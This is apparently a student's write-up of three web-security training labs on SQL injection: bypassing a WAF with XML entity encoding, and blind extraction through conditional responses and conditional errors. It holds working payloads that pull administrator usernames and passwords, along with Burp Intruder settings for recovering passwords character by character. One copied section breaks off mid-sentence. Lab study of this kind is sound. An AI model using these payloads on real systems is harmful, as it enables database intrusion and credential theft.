### Lab: SQL Injection with Filter Bypass via XML Encoding (WAF Bypass + Data Extraction)


## Objective
Bypass a Web Application Firewall (WAF) protecting an XML-based SQL injection
point, then extract usernames and passwords from the database.

## Steps Taken

### 1. Identified the injection point
Observed that the stock check feature sent `productId` and `storeId` to the
server in XML format via a `POST /product/stock` request. Sent this request
to Burp Repeater for testing.

### 2. Confirmed input was being evaluated
Tested the `storeId` field with a mathematical expression instead of a plain
number:
```xml
<storeId>1+1</storeId>
```
The application returned stock for a different store — confirming the value
was being evaluated server-side, not just passed through as a literal string.

### 3. Attempted to determine column count
Tried a UNION SELECT to test the underlying query:
```xml
<storeId>1 UNION SELECT NULL</storeId>
```
This request was blocked — the application flagged it as a potential attack,
indicating a WAF (Web Application Firewall) was filtering suspicious SQL
keywords/patterns before they reached the application.

### 4. Bypassed the WAF using XML entity encoding
Since the injection point was inside XML data, encoded the payload using XML
entities (via Burp's Hackvertor extension: Encode → hex_entities), converting
the SQL keywords into a form the WAF's pattern-matching didn't recognize as
malicious, while the XML parser on the server still decoded it back to valid
SQL before execution.

Resent the encoded request and received a normal response — confirming the
WAF was successfully bypassed.

### 5. Determined the query returns a single column
Testing showed that returning more than one column caused the application to
respond with "0 units," indicating an error meaning the original query only
selects a single column.

### 6. Extracted credentials via string concatenation
Since only one column could be returned, concatenated the username and
password fields into a single value using a separator character:
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```
This returned all usernames and passwords from the `users` table, separated
by `~`, within the single allowed column.

### 7. Logged in as administrator
Used the extracted administrator credentials to log in, gaining
administrative access and solving the lab.

## What I Learned
This lab combined three separate concepts into one real attack chain:

1. **WAFs filter patterns, not intent:** the WAF blocked the literal string
   `UNION SELECT`, but had no way to catch the same instruction once it was
   XML-entity encoded and later decoded server-side. This shows why
   defense-in-depth matters: a WAF alone is not a substitute for fixing the
   underlying SQL injection vulnerability.
2. **Column count matters for UNION-based injection:** before data can be
   exfiltrated via UNION SELECT, the attacker must match the number of
   columns in the original query, or the query fails.
3. **String concatenation bypasses single-column limitations:** when only
   one column can be returned, multiple values (like username and password)
   can still be extracted together by concatenating them with a delimiter.

This was the most advanced lab so far in my SQL injection learning, combining
WAF evasion, blind query structure analysis, and credential extraction into a
single realistic attack scenario.



### Lab2:Blind SQL injection with conditional responses
Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.
Modify the TrackingId cookie, changing it to:

TrackingId=xyz' AND '1'='1
Verify that the Welcome back message appears in the response.

Now change it to:

TrackingId=xyz' AND '1'='2
Verify that the Welcome back message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

Now change it to:

TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
Verify that the condition is true, confirming that there is a table called users.

Now change it to:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Verify that the condition is true, confirming that there is a user called administrator.

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
This condition should be true, confirming that the password is greater than 1 character in length.

Send a series of follow-up values to test different password lengths. Send:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
Then send:

TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the Welcome back message disappears), you have determined the length of the password, which is in fact 20 characters long.

After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
In Burp Intruder, change the value of the cookie to:

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the Add § button. You should then see the following as the cookie value (note the payload position markers):


### Lab: Blind SQL Injection with Conditional Responses
Completed: [aaj ki date]

## Objective
Exploit a blind SQL injection vulnerability — where the application doesn't
directly display query results or errors — by inferring information one
true/false condition at a time, using the presence/absence of a "Welcome
back" message as the signal.

## Steps Taken

### 1. Identified the injection point
Intercepted the request containing the `TrackingId` cookie using Burp Suite
and confirmed it was being used in a server-side SQL query.

### 2. Confirmed a boolean-based injection was possible
Tested a condition known to be true:
TrackingId=xyz' AND '1'='1
The "Welcome back" message appeared. Then tested a condition known to be false:
TrackingId=xyz' AND '1'='2
The message disappeared. This confirmed the application's response visibly
changes based on whether the injected condition evaluates to true or false —
the foundation of blind SQL injection.

### 3. Confirmed table and user existence
Used subqueries to test for the existence of specific data without ever
seeing the data directly:
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Both returned true, confirming a `users` table exists and contains an
`administrator` account.

### 4. Determined password length
Used the `LENGTH()` function combined with the same true/false technique,
incrementing the tested length each time:
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a
Increased N manually via Burp Repeater until the condition stopped being
true, revealing the password length: 20 characters.

### 5. Extracted the password character-by-character using Burp Intruder
Manually testing every character at every position (20 positions × 36
possible characters) would mean hundreds of requests, so switched to **Burp
Intruder** to automate this:
- Used `SUBSTRING(password, position, 1)` to isolate one character at a time
- Set a payload position marker on the character being guessed:
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
- Configured the payload list to lowercase letters (a-z) and digits (0-9)
- Set a **Grep - Match** rule for the string "Welcome back" so Intruder could
  automatically flag which payload produced a true result
- Ran the attack, identified the correct character where "Welcome back"
  appeared (ticked in results)
- Repeated the process for each position (changing offset 1 → 2 → 3...) until
  all 20 characters of the password were recovered

### 6. Logged in as administrator
Used the fully reconstructed password to log in via the account login page,
solving the lab.

## What I Learned
This lab was a significant step up from previous SQL injection labs because
no data was ever directly visible in the response — everything had to be
inferred through true/false behavior alone (a technique called **blind SQL
injection**). Key takeaways:

1. **Any observable difference in application behavior can leak information**
   — here, the presence or absence of a single UI message was enough to
   extract an entire password, one bit of information at a time.
2. **Burp Intruder is essential for scaling manual techniques** — testing 20
   characters against 36 possibilities manually would take hundreds of
   requests; Intruder automates the payload cycling and uses response
   grep-matching to instantly identify the correct value.
3. **SUBSTRING-based extraction is a core blind SQLi technique** — isolating
   one character at a time via a subquery is the standard method for
   extracting unknown data when no direct output channel exists.

This connects to earlier labs (UNION-based extraction, WAF bypass) by showing
a different extraction strategy entirely — used when the application gives no
direct data back, only a behavioral signal.



### Lab: Blind SQL Injection with Conditional Errors
Completed: [aaj ki date]

## Objective
Exploit a blind SQL injection vulnerability where the application gives no
visible difference in content between true/false conditions — instead,
information must be inferred by deliberately triggering (or avoiding) a
database error, detectable via the HTTP response status code.

## Steps Taken

### 1. Confirmed the injection point was interpreted as SQL
Tested the `TrackingId` cookie with a single quote:
TrackingId=xyz'
This produced an error. Adding a second quote to close the string:
TrackingId=xyz''
removed the error — confirming the input was affecting SQL syntax directly.

### 2. Identified the database type
Constructed a subquery to confirm the injection was being processed as valid
SQL, rather than causing an unrelated error:
TrackingId=xyz'||(SELECT '')||'
This still errored. Adding an explicit table name:
TrackingId=xyz'||(SELECT '' FROM dual)||'
resolved the error — since Oracle requires all SELECT statements to reference
a table (using `dual` when none is needed), this confirmed the backend
database was **Oracle**.

### 3. Confirmed error-based signaling works
Verified that querying a non-existent table:
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
produced an error, proving the application's error behavior directly reflects
the validity of the injected SQL — giving a reliable true/false channel even
without any visible content difference.

### 4. Confirmed table and user existence
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
No error returned, confirming the `users` table exists (using `ROWNUM = 1` to
prevent multiple rows from breaking the query).

### 5. Used conditional errors to test true/false logic
Instead of relying on visible content changes, used a `CASE` statement that
deliberately triggers a divide-by-zero error only when a condition is true:
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
This errored (condition true). Testing a false condition:
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
produced no error — confirming conditional error triggering as a reliable
true/false signal.

### 6. Confirmed the administrator account exists
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Triggered an error, confirming the `administrator` user exists.

### 7. Determined password length
Incremented a length check using the same conditional-error technique:
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Increased N via Burp Repeater until the error stopped appearing, revealing a
password length of 20 characters.

### 8. Extracted the password using Burp Intruder
Automated character-by-character extraction using `SUBSTR()` inside the same
conditional-error structure:
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
- Set a payload position marker on the guessed character
- Configured payloads: lowercase a-z and 0-9
- Instead of grep-matching text (as in the previous lab), identified the
  correct character by checking the **HTTP status code** in Intruder's
  results — HTTP 500 indicated the condition was true (error triggered),
  HTTP 200 indicated false
- Repeated the attack for each character offset (1 → 20) to reconstruct the
  full password

### 9. Logged in as administrator
Used the recovered password to log in and solve the lab.

## What I Learned
This lab is a variant of blind SQL injection called **error-based blind SQLi**,
distinct from the earlier conditional-*content* technique:

1. **Two different blind SQLi signals exist** — conditional differences in
   page *content* (previous lab) vs. conditional *errors/status codes*
   (this lab). When content doesn't change based on true/false conditions,
   deliberately forcing an error (e.g. divide-by-zero) becomes the covert
   channel instead.
2. **Fingerprinting the database matters** — the requirement to reference
   `dual` revealed the backend was Oracle, which directly shaped the syntax
   of every subsequent payload (Oracle-specific functions like `TO_CHAR` and
   `SUBSTR` were required).
3. **Burp Intruder can filter on status code, not just response text** — this
   lab used HTTP 500 vs. 200 as the success indicator instead of grep-matching
   a string, showing Intruder's flexibility for different blind injection
   scenarios.

This reinforces that blind SQL injection isn't one fixed technique — it's a
category of approaches, and identifying which observable signal (content,
error, timing) is available is the first step before choosing an extraction
method.
